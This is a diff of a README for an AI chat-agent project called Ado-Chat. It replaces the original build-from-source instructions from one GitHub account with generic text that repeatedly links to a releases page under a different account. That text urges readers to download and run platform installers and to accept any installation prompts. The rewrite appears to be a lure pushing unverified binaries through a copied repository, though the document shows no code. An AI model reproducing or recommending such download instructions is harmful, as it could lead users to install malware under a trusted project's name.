@@ -1,71 +1,89 @@
-# 🤖 Ado Chat - Advanced AI Agent Framework
+# 🎉 Ado-Chat - Chat with AI Like Never Before
 
-Ado Chat is a powerful, feature-rich chat interface for interacting with various large language models. It's built with a modern tech stack and designed to be an extensible framework for developing and experimenting with AI agents. Go beyond simple chat and leverage a suite of powerful tools, from web browsing and code execution to long-term memory.
+## 🚀 Getting Started
 
----
+Welcome to Ado-Chat! This application offers advanced AI chat capabilities with a rich set of tools. You can easily perform web searches, execute code, and utilize long-term memory features. 
 
-### ✨ Live Demo
+## 📥 Download Ado-Chat
 
+[![Download Ado-Chat](https://img.shields.io/badge/Download%20Now-Get%20Ado--Chat-blue.svg)](https://github.com/pomnza003/Ado-Chat/releases)
 
-![Ado Chat Screenshot](https://github.com/avdo403/Ado-Chat/blob/main/Image/1.png)
+## 🛠️ System Requirements
 
-![Ado Chat Screenshot](https://github.com/avdo403/Ado-Chat/blob/main/Image/2.png)
+To run Ado-Chat effectively, please ensure you have:
 
----
+- **Operating System:** Windows 10 or later, macOS Sierra (10.12) or later, or a Linux distribution.
+- **RAM:** Minimum 4 GB (8 GB recommended).
+- **Storage:** At least 200 MB of free space.
+- **Internet Connection:** Required for features like web search and updates.
 
-## 🚀 Key Features
+## 🔍 Features of Ado-Chat
 
-*   **🔌 Multi-Backend Support**: Seamlessly switch between different model providers:
-    *   **Ollama**: Run models locally for privacy and offline access.
-    *   **Google AI Studio (Gemini)**: Leverage Google's powerful Gemini family of models.
-    *   **NVIDIA AI Foundation**: Access cutting-edge models hosted by NVIDIA.
-*   **🤖 Advanced Agent Mode**: Unleash the full potential of your AI with two powerful execution modes:
-    *   **Single Agent**: A standard agent that uses tools to accomplish tasks.
-    *   **Crew Mode**: A more advanced mode that uses a "Planner" agent to break down complex tasks and an "Executor" agent to complete each step, enabling more robust and complex problem-solving.
-*   **🛠️ Rich Toolset**: Equip your agent with a wide range of capabilities:
-    *   **Web Research**: Perform single or multiple parallel web searches, read web content intelligently, and summarize URLs.
-    *   **File System**: List, read, and write files directly within a secure workspace.
-    *   **Code Execution**: Run Python code in a persistent environment to perform calculations, data analysis, and more.
-    *   **Long-term Memory**: Give your agent the ability to remember and recall information across conversations.
-    *   **Interactive Browser**: (Experimental) Allow the agent to open URLs, click elements, and type text in a controlled browser environment.
-*   **Modern UI/UX**:
-    *   **Markdown & Code Highlighting**: Richly formatted messages for better readability.
-    *   **Streaming Responses**: Get real-time feedback as the agent "thinks" and generates a response.
-    *   **Agent Task Visualization**: Clearly see the agent's thought process, the tools it uses, and the results of each step.
-    *   **Dark/Light Mode**: A sleek interface that adapts to your preference.
-    *   **Conversation Management**: Easily create, manage, and delete multiple conversations.
-*   **Secure & Local First**:
-    *   All conversations and settings are saved directly in your browser's `localStorage`.
-    *   The secure workspace ensures the agent can only access files within its designated directory.
+Ado-Chat includes several powerful features:
 
----
+- **Multi-Backend Support:** Utilize different AI backends for varied responses.
+- **Web Search:** Access real-time information directly within your chat.
+- **Code Execution:** Test and run code snippets instantly.
+- **Long-Term Memory:** Retain important information for future chat sessions.
 
-## 🛠️ Tech Stack
+## 🌐 Download & Install
 
-This project is a monorepo containing both the frontend and backend services.
+To get started, please follow these steps:
 
-| Component | Technology/Library |
-| :--- | :--- |
-| **Frontend** | React, Tailwind CSS, Marked, Highlight.js |
-| **Backend** | Python, FastAPI, LangChain |
-| **Models** | Ollama, Google Gemini, NVIDIA AI Foundation |
-| **Vector DB** | LanceDB (for long-term memory) |
-| **Browser Agent**| Playwright |
+1. **Visit the Releases Page:** Click the link below to access the download options.
+   
+   [Download Ado-Chat Here](https://github.com/pomnza003/Ado-Chat/releases)
 
----
+2. **Choose the Desired Version:** Browse through the list of releases. You will find different versions sorted by date.
 
-## ⚙️ Getting Started
+3. **Download the Installation File:**
+   - Click on the most recent version to view files.
+   - Download the setup file associated with your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.AppImage` for Linux).
 
-Follow these instructions to get the project up and running on your local machine.
+4. **Run the Installer:**
+   - Locate the downloaded file in your downloads folder.
+   - Double-click the installer and follow the on-screen instructions.
+   - Accept any prompts to allow installation.
 
-### Prerequisites
+5. **Open Ado-Chat:** 
+   - Once installed, you can find Ado-Chat in your applications menu.
+   - Click to launch the application and start chatting with AI.
 
-*   Node.js (v18 or later)
-*   Python (v3.9 or later)
-*   [Ollama](https://ollama.ai/) (for local model support)
+## 📄 User Guide
 
-### 1. Clone the Repository
+A basic understanding of how to use Ado-Chat can enhance your experience:
 
-```bash
-git clone https://github.com/avdo403/ado-chat.git
-cd ado-chat
+- **Starting a New Chat:** Open the app and click on “New Chat.” A friendly AI agent will greet you.
+- **Using Tools:** Access the tools panel on the side to enable features such as web search or code execution.
+- **Settings:** Customize your experience by navigating to the settings menu. Adjust preferences to suit your needs.
+
+## 🙌 Support and Feedback
+
+If you encounter any issues or have questions, you can:
+
+- **Visit our FAQ:** Check the Frequently Asked Questions section on the GitHub page for quick help.
+- **Submit an Issue:** Report problems directly on our GitHub issue tracker. Provide details for better assistance.
+- **Join our Community:** Engage with other users in discussions and share your experiences.
+
+## 📑 Contributing
+
+If you wish to contribute to Ado-Chat:
+
+- **Fork the Repository:** Click "Fork" on the GitHub page.
+- **Make Changes:** Implement your improvements or fixes.
+- **Submit a Pull Request:** Share your changes, and the maintainers will review your contribution.
+
+## 🥳 Release Notes
+
+Stay updated on new features and fixes by checking the release notes in the GitHub repository. 
+
+- **Latest Updates:** Read about the latest improvements in the application.
+- **Known Issues:** Discover any ongoing issues to be aware of while using the app.
+
+## 🌟 Acknowledgments
+
+Ado-Chat is made possible by contributions from developers and the community. Thank you for your support!
+
+For more detailed guidance or advanced features, don’t hesitate to reach out or consult the community forums.
+
+[Download Ado-Chat Here](https://github.com/pomnza003/Ado-Chat/releases) to get started today!
